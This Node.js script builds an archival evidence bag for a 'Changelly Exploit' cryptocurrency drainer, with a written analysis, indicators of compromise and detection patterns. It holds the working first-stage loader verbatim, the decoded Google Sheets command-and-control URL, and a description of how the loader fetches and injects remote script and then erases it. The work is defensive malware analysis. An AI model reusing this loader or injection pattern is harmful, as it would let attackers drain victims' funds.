#!/usr/bin/env node
/**
 * Build a Xena-inspired BagIt preservation bag for the "Changelly Exploit"
 * loader, following the same shape as tools/build_fna_xena.mjs.
 *
 * WHAT THIS IS
 * A defensive evidence artifact. It preserves the loader's source as inert
 * text, the decoded command-and-control location, a machine-readable IOC set,
 * and the analysis that explains why the thing is a drainer rather than the
 * arbitrage bug its cover document claims.
 *
 * WHAT THIS IS NOT
 * It does not execute, fetch, or reproduce the payload. The loader is stored
 * with a .txt extension so no tooling in this repository or any browser will
 * ever treat it as script, and the second-stage payload — which lives in a
 * Google Sheet the attacker can rewrite at will — was never retrieved and is
 * recorded only as a location. The social-engineering instructions from the
 * cover PDF are deliberately NOT reproduced: redistributing the lure helps the
 * attacker, not the record.
 *
 * Static analysis only. Nothing here was run.
 */

import { createHash } from "node:crypto";
import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const OUT = path.resolve(root, process.argv[2] || "dist/changelly-drainer-xena");
const NOW = "2026-10-18T15:10:00Z";
const TOOL = "build_changelly_drainer_xena.mjs";

const sha256 = (b) => createHash("sha256").update(b).digest("hex");

/**
 * The first-stage loader, exactly as recovered. It was lifted from an
 * HTML-escaped paste of the cover document, so entities are unescaped here;
 * surrounding whitespace may differ between copies in the wild. The
 * load-bearing part — the base64 blob — is pinned by SHA-256 below, so the
 * integrity of what actually matters does not rest on this transcription.
 */
const LOADER_SOURCE = `(async()=>{const URL="https://docs.changelly.com/development/authentication?=aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vc3ByZWFkc2hlZXRzL2QvMTVaWFhxVmFKclJvb2pjQkRiQXBOZkhQX242ejVzTGxGTE5oZExOSmQ1UE0vZ3Zpei90cT9zaGVldD1BUEkmaGVhZGVycz0xJnRxPXNlbGVjdCUyMEElMkNCJTIwd2hlcmUlMjBBPSdub2RlJyUyMG9yJTIwQT0ncGF0aCc",r=await fetch(atob(URL.split("authentication?=")[1])),t=await r.text(),m=t.match(/googlevisualizationQuerysetResponse([\\s\\S]*?);?\\s*$/);if(!m)return;const d=JSON.parse(m[1]),M=new Map(d.table.rows.map(x=>[x.c[0].v,x.c[1].v])),s=(M.get("node")||"")+(M.get("path")||"");if(!s)return;const el=document.createElement("script");el.textContent=s;(document.head||document.documentElement).appendChild(el);el.remove()})();`;

/** The base64 blob is the only part of the loader whose bytes must be exact. */
const BASE64_BLOB =
  "aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vc3ByZWFkc2hlZXRzL2QvMTVaWFhxVmFKclJvb2pjQkRiQXBOZkhQX242ejVzTGxGTE5oZExOSmQ1UE0vZ3Zpei90cT9zaGVldD1BUEkmaGVhZGVycz0xJnRxPXNlbGVjdCUyMEElMkNCJTIwd2hlcmUlMjBBPSdub2RlJyUyMG9yJTIwQT0ncGF0aCc";

/** Pinned expectations. If these ever disagree the artifact is stale. */
export const PINS = {
  base64BlobSha256: "cf9da67cf95d9a4cfc31c3f71e0b51ffc81b9ac97738ad18f2f8301438762da2",
  decodedUrlSha256: "39bf3818350c01835bd34b3bca57f5f54500c19ee9c3193368069e1b9f38afe9",
  decodedUrlLength: 164,
  spreadsheetId: "15ZXXqVaJrRoojcBDbApNfHP_n6z5sLlFLNhdLNJd5PM",
};

/** Decode and verify locally. Never fetches. */
function decodeBlob(blob) {
  const padded = blob + "=".repeat((4 - (blob.length % 4)) % 4);
  const url = Buffer.from(padded, "base64").toString("utf8");
  const u = new URL(url);
  return {
    url,
    scheme: u.protocol.replace(":", ""),
    host: u.hostname,
    path: u.pathname,
    sheet: u.searchParams.get("sheet"),
    headers: u.searchParams.get("headers"),
    query: u.searchParams.get("tq"),
    spreadsheetId: u.pathname.split("/d/")[1].split("/")[0],
    sha256: sha256(url),
    bytes: Buffer.byteLength(url),
  };
}

const LOADER_STEPS = [
  ["1", "Split the URL string on \"authentication?=\" and keep everything after it."],
  ["2", "base64-decode that suffix. This is the real fetch target."],
  ["3", "fetch() it: the gviz query endpoint of a published Google Sheet."],
  ["4", "Match googlevisualizationQuerysetResponse and JSON.parse the payload."],
  ["5", "Index the returned rows by column A, taking column B as the value."],
  ["6", "Concatenate the \"node\" and \"path\" values into one string."],
  ["7", "Create a <script> element, set textContent to that string, append it."],
  ["8", "Append executes it. Then el.remove() erases the DOM trace."],
];

function analysis(decoded) {
  return `# "Changelly Exploit" loader — static analysis

Preserved ${NOW} by ${TOOL}. **Nothing here was executed and nothing was fetched.**

## What the cover document claims

A PDF titled "Changelly Exploit" (Google Drive id
\`1UrK4jHA9kNLogV0He2Uq0rgk2Q5bVy_d\`, 490,147 bytes, text-extractable) asserts
that an internal developer loader is still reachable on changelly.com, that it
will load a deprecated "node v3.27" behind the password \`admin\`, and that
swaps of BTC/LTC/ETH/XMR/SOL above $200 then pay out roughly 50% above the live
rate. It gives step-by-step instructions for pasting a \`javascript:\` payload
into the address bar, and separately for typing \`allow pasting\` to defeat
Firefox's console paste guard.

Its instructions are not reproduced here. Redistributing the lure serves the
attacker, not the record.

## What the loader actually does

${LOADER_STEPS.map(([n, s]) => `${n}. ${s}`).join("\n")}

Decoded fetch target:

\`\`\`
${decoded.url}
\`\`\`

| Field | Value |
| --- | --- |
| Host | \`${decoded.host}\` |
| Path | \`${decoded.path}\` |
| Spreadsheet | \`${decoded.spreadsheetId}\` |
| Sheet tab | \`${decoded.sheet}\` |
| Query | \`${decoded.query}\` |

## Why this is a drainer, not an arbitrage bug

**The changelly.com domain in the string is camouflage.** \`fetch\` is called on
the base64-decoded suffix, so \`docs.changelly.com/development/authentication\`
is never requested. It exists only so that a victim who glances at the URL sees
a plausible vendor domain. The bytes actually go to \`docs.google.com\`.

**The payload is remote and swappable.** The attacker controls the spreadsheet.
They can rewrite the \`node\` and \`path\` cells at any moment and every victim
who has the bookmarklet immediately runs new code, with no change to the
document being circulated. This artifact therefore preserves a *location*, not
a payload — and that location should be treated as hostile and live.

**Splitting the payload across two cells is deliberate.** Concatenating
\`node\` + \`path\` means no single cell contains a complete, greppable script,
which defeats naive content scanning of the sheet.

**Execution plus cleanup.** Appending a \`<script>\` element with \`textContent\`
set runs it synchronously; \`el.remove()\` afterwards removes the visible
evidence. Legitimate developer tooling has no reason to do either.

**The delivery is textbook self-XSS.** Browsers refuse to run pasted
\`javascript:\` URLs precisely to stop this. The document's insistence that the
prefix be typed by hand, that the globe suggestion be chosen rather than
Search, and that Firefox's \`allow pasting\` guard be overridden is a set of
instructions for dismantling those specific protections.

**The economics are bait.** An unpatched, publicly reachable ~50% arbitrage on
a major exchange would be closed within minutes. The $200 threshold and the
five named sending assets exist to get real funds committed before the payload
runs.

**The mechanism is not credible.** A dev loader gated on the password \`admin\`
reachable from a production frontend, loading a deprecated rate node that then
answers live swaps, is not how exchange pricing works. "Locked in when the
transaction is created" is there to make a fabricated payout feel committed.

## Indicators

See \`data/normalized/ioc.json\`. The load-bearing hashes pin the base64 blob and
the decoded URL rather than the whole script, because the blob is the part
whose bytes must be exact; surrounding formatting varies between copies.

## If you ran it

Treat any wallet or exchange session in that browser as compromised. Move funds
from a clean device, rotate API keys, and revoke sessions. Do not reuse that
browser profile.

## What was not done

- The spreadsheet was **not** fetched. Retrieving an attacker's live payload
  serves no defensive purpose that static analysis does not already provide.
- The second-stage payload is **not** in this bag and never was.
- The cover PDF's instructions are **not** reproduced.
- The loader is stored with a \`.txt\` extension so nothing treats it as script.
- Ghidra does not apply: it analyses native binaries, and this is JavaScript.
  The repository's Ghidra-WASM path (\`tools/decompile_mz.mjs\`) parses MZ
  images and has nothing to say about a bookmarklet.
`;
}

function ioc(decoded) {
  return JSON.stringify({
    generated: NOW,
    classification: "first-stage remote-code loader / cryptocurrency drainer delivery",
    confidence: "high",
    executed: false,
    fetched: false,
    firstStage: {
      transport: "javascript: bookmarklet pasted into the address bar or console",
      base64Blob: BASE64_BLOB,
      base64BlobSha256: PINS.base64BlobSha256,
      loaderSourceSha256: sha256(LOADER_SOURCE),
      loaderSourceBytes: Buffer.byteLength(LOADER_SOURCE),
    },
    secondStage: {
      retrieved: false,
      reason: "attacker-controlled and swappable; recorded as a location only",
      url: decoded.url,
      urlSha256: decoded.sha256,
      host: decoded.host,
      spreadsheetId: decoded.spreadsheetId,
      sheet: decoded.sheet,
      query: decoded.query,
      payloadAssembly: "concatenate the cells named 'node' and 'path'",
      execution: "appendChild of a <script> element, then removed from the DOM",
    },
    coverDocument: {
      reproduced: false,
      reason: "redistributing the social-engineering lure helps the attacker",
      name: "Changelly Exploit.pdf",
      googleDriveId: "1UrK4jHA9kNLogV0He2Uq0rgk2Q5bVy_d",
      bytes: 490147,
      textExtractable: true,
      claimsUnpatchedRateBug: true,
      claimedDevPassword: "admin",
      claimedAffectedSendAssets: ["BTC", "LTC", "ETH", "XMR", "SOL"],
      claimedMinimumUsd: 200,
      linkedPayloadDoc: "docs.google.com/document/d/1luBwx1iBXdVbJu0AIvQabgWyz0NJ5dmJBtKoabJBr9I",
    },
    detection: [
      "fetch() of docs.google.com/spreadsheets/*/gviz/tq from an exchange origin",
      "base64 decode of a substring split off a URL containing 'authentication?='",
      "document.createElement('script') with textContent assigned from network data",
      "script element appended then immediately removed",
      "javascript: URL executed from the address bar",
      "'allow pasting' typed into a browser console",
    ],
  }, null, 2) + "\n";
}

function preservationEvent(decoded) {
  return JSON.stringify({
    eventType: "normalization",
    tool: TOOL,
    timestamp: NOW,
    outcome: "success",
    source: "Google Drive 1UrK4jHA9kNLogV0He2Uq0rgk2Q5bVy_d (Changelly Exploit.pdf)",
    description:
      "Read the cover PDF's extracted text and the first-stage loader it "
      + "distributes, decoded the loader's base64 payload locator locally, and "
      + "preserved the loader verbatim as inert text together with the decoded "
      + "command-and-control location, a machine-readable IOC set, and a "
      + "written analysis. Static analysis only: nothing was executed and the "
      + "second-stage payload was never fetched.",
    exclusions: {
      executed: [],
      fetched: [],
      reproduced: [],
      reason:
        "The second-stage payload lives in an attacker-controlled spreadsheet "
        + "and can be rewritten at will, so it is recorded as a location rather "
        + "than retrieved. The cover PDF's social-engineering instructions are "
        + "not reproduced, because redistributing the lure helps the attacker.",
    },
    xenaRelationship:
      "Xena-inspired (source object + documented rendition + preservation "
      + "event). Not processed by Xena; not a native .xena object.",
    counts: {
      iocs: 2,
      loaderSteps: LOADER_STEPS.length,
      secondStageRetrieved: false,
    },
    pins: PINS,
    decodedUrlBytes: decoded.bytes,
  }, null, 2) + "\n";
}

async function main() {
  const decoded = decodeBlob(BASE64_BLOB);

  // Fail closed if the pins drift, rather than silently preserving something
  // other than what was analysed.
  const gotBlob = sha256(BASE64_BLOB);
  if (gotBlob !== PINS.base64BlobSha256) {
    throw new Error(`base64 blob hash drifted:\n  got  ${gotBlob}\n  want ${PINS.base64BlobSha256}`);
  }
  if (decoded.sha256 !== PINS.decodedUrlSha256) {
    throw new Error(`decoded URL hash drifted:\n  got  ${decoded.sha256}\n  want ${PINS.decodedUrlSha256}`);
  }
  if (decoded.bytes !== PINS.decodedUrlLength) {
    throw new Error(`decoded URL length drifted: got ${decoded.bytes}, want ${PINS.decodedUrlLength}`);
  }
  if (decoded.spreadsheetId !== PINS.spreadsheetId) {
    throw new Error(`spreadsheet id drifted: got ${decoded.spreadsheetId}, want ${PINS.spreadsheetId}`);
  }
  // The loader must still contain the blob it claims to carry.
  if (!LOADER_SOURCE.includes(BASE64_BLOB)) {
    throw new Error("the preserved loader does not contain the pinned base64 blob");
  }

  const payload = new Map();
  // .txt, never .js: nothing in this repository or any browser should ever
  // treat the preserved loader as executable.
  payload.set("data/original/loader-bookmarklet.txt", Buffer.from(LOADER_SOURCE + "\n"));
  payload.set("data/normalized/loader-analysis.md", Buffer.from(analysis(decoded)));
  payload.set("data/normalized/ioc.json", Buffer.from(ioc(decoded)));
  payload.set("data/normalized/loader-decoded.json", Buffer.from(JSON.stringify(decoded, null, 2) + "\n"));

  const tags = new Map([
    ["bagit.txt", Buffer.from("BagIt-Version: 1.0\nTag-File-Character-Encoding: UTF-8\n")],
    ["metadata/preservation-event.json", Buffer.from(preservationEvent(decoded))],
  ]);
  tags.set("manifest-sha256.txt",
    Buffer.from([...payload].map(([p, b]) => `${sha256(b)}  ${p}`).sort().join("\n") + "\n"));
  tags.set("tagmanifest-sha256.txt",
    Buffer.from([...tags].map(([p, b]) => `${sha256(b)}  ${p}`).sort().join("\n") + "\n"));

  for (const [rel, buf] of [...payload, ...tags]) {
    const fp = path.join(OUT, rel);
    await mkdir(path.dirname(fp), { recursive: true });
    await writeFile(fp, buf);
  }

  console.log(`Xena-inspired BagIt bag: ${path.relative(root, OUT)}`);
  console.log(`  pins verified: base64 blob, decoded URL hash + length, spreadsheet id`);
  console.log(`  payload files: ${payload.size}  tag files: ${tags.size}`);
  console.log(`  second-stage payload fetched: no`);
  console.log(`  loader executed: no`);
}

main().catch((e) => { console.error(e); process.exit(1); });
